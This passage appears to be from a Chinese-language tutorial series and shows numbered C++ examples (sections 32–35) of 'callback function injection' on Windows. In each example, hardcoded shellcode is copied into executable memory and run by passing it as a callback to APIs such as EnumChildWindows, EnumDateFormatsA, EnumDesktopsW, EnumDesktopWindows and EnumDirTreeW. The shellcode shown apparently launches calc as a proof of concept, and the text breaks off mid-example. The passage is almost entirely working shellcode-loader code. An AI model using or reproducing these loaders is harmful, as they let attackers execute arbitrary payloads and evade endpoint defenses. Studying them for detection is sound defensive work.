<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span></span>{<br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumChildWindows((HWND)&nbsp;<span class="hljs-literal">NULL</span>,(WNDENUMPROC)&nbsp;hAlloc,<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span><br><span class="linenum hljs-number">52</span><br><span class="linenum hljs-number">53</span>}<br></code></pre>
<h1 id="h32enumdateformatsa"><span>32.回调函数注入 通过 EnumDateFormatsA</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span></span>{<br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumDateFormatsA((DATEFMT_ENUMPROCA)hAlloc&nbsp;,&nbsp;LOCALE_SYSTEM_DEFAULT,&nbsp;(DWORD)&nbsp;<span class="hljs-number">0</span>);<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>}<br></code></pre>
<h1 id="h33enumdesktopw"><span>33.回调函数注入 通过 EnumDesktopW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">"Wingdi.h"</span></span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span><br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span></span>{<br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span><br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span><br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">52</span><br><span class="linenum hljs-number">53</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumDesktopsW(GetProcessWindowStation(),(DESKTOPENUMPROCW)&nbsp;hAlloc,&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">54</span><br><span class="linenum hljs-number">55</span><br><span class="linenum hljs-number">56</span><br><span class="linenum hljs-number">57</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>,&nbsp;GetLastError());<br><span class="linenum hljs-number">58</span><br><span class="linenum hljs-number">59</span><br><span class="linenum hljs-number">60</span><br><span class="linenum hljs-number">61</span><br><span class="linenum hljs-number">62</span><br><span class="linenum hljs-number">63</span>&nbsp;&nbsp;&nbsp;&nbsp;VirtualFree(hAlloc,<span class="hljs-number">0</span>,&nbsp;MEM_RELEASE);<br><span class="linenum hljs-number">64</span><br><span class="linenum hljs-number">65</span>}<br></code></pre>
<h1 id="h34enumdesktopwindows"><span>34.回调函数注入 通过 EnumDesktopWindows</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-comment">//#include&nbsp;"stdafx.h"</span><br><span class="linenum hljs-number"> 2</span><br><span class="linenum hljs-number"> 3</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="linenum hljs-number"> 4</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span><br><span class="linenum hljs-number">10</span><br><span class="linenum hljs-number">11</span></span>{<br><span class="linenum hljs-number">12</span><br><span class="linenum hljs-number">13</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">char</span>&nbsp;shellcode[]&nbsp;=&nbsp;<span class="hljs-string">"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"</span><br><span class="linenum hljs-number">14</span><br><span class="linenum hljs-number">15</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"</span><br><span class="linenum hljs-number">16</span><br><span class="linenum hljs-number">17</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"</span><br><span class="linenum hljs-number">18</span><br><span class="linenum hljs-number">19</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"</span><br><span class="linenum hljs-number">20</span><br><span class="linenum hljs-number">21</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x57\x78\x01\xc2\x8b\x7a\x20\x01"</span><br><span class="linenum hljs-number">22</span><br><span class="linenum hljs-number">23</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"</span><br><span class="linenum hljs-number">24</span><br><span class="linenum hljs-number">25</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x45\x81\x3e\x43\x72\x65\x61\x75"</span><br><span class="linenum hljs-number">26</span><br><span class="linenum hljs-number">27</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xf2\x81\x7e\x08\x6f\x63\x65\x73"</span><br><span class="linenum hljs-number">28</span><br><span class="linenum hljs-number">29</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"</span><br><span class="linenum hljs-number">30</span><br><span class="linenum hljs-number">31</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"</span><br><span class="linenum hljs-number">34</span><br><span class="linenum hljs-number">35</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\xb1\xff\x53\xe2\xfd\x68\x63\x61"</span><br><span class="linenum hljs-number">36</span><br><span class="linenum hljs-number">37</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x6c\x63\x89\xe2\x52\x52\x53\x53"</span><br><span class="linenum hljs-number">38</span><br><span class="linenum hljs-number">39</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-string">"\x53\x53\x53\x53\x52\x53\xff\xd7"</span>;<br><span class="linenum hljs-number">40</span><br><span class="linenum hljs-number">41</span>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hAlloc&nbsp;=&nbsp;VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">42</span><br><span class="linenum hljs-number">43</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(hAlloc,&nbsp;shellcode,&nbsp;<span class="hljs-keyword">sizeof</span>(shellcode));<br><span class="linenum hljs-number">44</span><br><span class="linenum hljs-number">45</span>&nbsp;&nbsp;&nbsp;&nbsp;EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()),<br><span class="linenum hljs-number">46</span><br><span class="linenum hljs-number">47</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(WNDENUMPROC)&nbsp;hAlloc,<br><span class="linenum hljs-number">48</span><br><span class="linenum hljs-number">49</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(LPARAM)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-literal">NULL</span>);<br><span class="linenum hljs-number">50</span><br><span class="linenum hljs-number">51</span>}<br></code></pre>
<h1 id="h35enumdirtreew"><span>35.回调函数注入 通过 EnumDirTreeW</span></h1>
<pre><code class="hljs cpp"><span class="linenum hljs-number"> 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="linenum hljs-number"> 2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="linenum hljs-number"> 3</span><br><span class="linenum hljs-number"> 4</span><span class="hljs-comment">//&nbsp;requires&nbsp;Dbghelp.lib</span><br><span class="linenum hljs-number"> 5</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span>&nbsp;<span class="hljs-meta-string">&lt;Dbghelp.h&gt;</span></span><br><span class="linenum hljs-number"> 6</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span>&nbsp;comment(lib,&nbsp;<span class="hljs-meta-string">"Dbghelp.lib"</span>)</span><br><span class="linenum hljs-number"> 7</span><br><span class="linenum hljs-number"> 8</span><span class="hljs-comment">//&nbsp;alfarom256&nbsp;calc&nbsp;shellcode</span><br><span class="linenum hljs-number"> 9</span><span class="hljs-keyword">unsigned</span>&nbsp;<span class="hljs-keyword">char</span>&nbsp;op[]&nbsp;=<br><span class="linenum hljs-number">10</span><span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"</span><br><span class="linenum hljs-number">11</span><span class="hljs-string">"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"</span><br><span class="linenum hljs-number">12</span><span class="hljs-string">"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"</span><br><span class="linenum hljs-number">13</span><span class="hljs-string">"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"</span><br><span class="linenum hljs-number">14</span><span class="hljs-string">"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"</span><br><span class="linenum hljs-number">15</span><span class="hljs-string">"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"</span><br><span class="linenum hljs-number">16</span><span class="hljs-string">"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"</span><br><span class="linenum hljs-number">17</span><span class="hljs-string">"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"</span><br><span class="linenum hljs-number">18</span><span class="hljs-string">"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"</span><br><span class="linenum hljs-number">19</span><span class="hljs-string">"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"</span><br><span class="linenum hljs-number">20</span><span class="hljs-string">"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"</span><br><span class="linenum hljs-number">21</span><span class="hljs-string">"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"</span><br><span class="linenum hljs-number">22</span><span class="hljs-string">"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"</span><br><span class="linenum hljs-number">23</span><span class="hljs-string">"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"</span><br><span class="linenum hljs-number">24</span><span class="hljs-string">"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"</span><br><span class="linenum hljs-number">25</span><span class="hljs-string">"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"</span><br><span class="linenum hljs-number">26</span><span class="hljs-string">"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"</span><br><span class="linenum hljs-number">27</span><span class="hljs-string">"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"</span><br><span class="linenum hljs-number">28</span><span class="hljs-string">"\x63\x2e\x65\x78\x65\x00"</span>;<br><span class="linenum hljs-number">29</span><br><span class="linenum hljs-number">30</span><span class="hljs-function"><span class="hljs-keyword">int</span>&nbsp;<span class="hljs-title">main</span><span class="hljs-params">()</span>&nbsp;</span>{<br><span class="linenum hljs-number">31</span><br><span class="linenum hljs-number">32</span><br><span class="linenum hljs-number">33</span>&nbsp;&nbsp;&nbsp;&nbsp;LPVOID&nbsp;address&nbsp;=&nbsp;::VirtualAlloc(<span class="hljs-literal">NULL</span>,&nbsp;<span class="hljs-keyword">sizeof</span>(op),&nbsp;MEM_RESERVE&nbsp;|&nbsp;MEM_COMMIT,&nbsp;PAGE_EXECUTE_READWRITE);<br><span class="linenum hljs-number">34</span>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-built_in">memcpy</span>(address,&nbsp;&amp;op[<span class="hljs-number">0</span>],&nbsp;<span class="hljs-keyword">sizeof</span>(op));<br><span class="linenum hljs-number">35</span><br><span class="linenum hljs-number">36</span>&nbsp;&nbsp;&nbsp;&nbsp;::SymInitialize(::GetCurrentProcess(),&nbsp;<span class="hljs-literal">NULL</span>,&nbsp;TRUE);<br><span class="linenum hljs-number">37</span><br><span class="linenum hljs-number">38</span>&nbsp;&nbsp;&nbsp;&nbsp;WCHAR&nbsp;dummy[<span class="hljs-number">522</span>];<br><span class="linenum 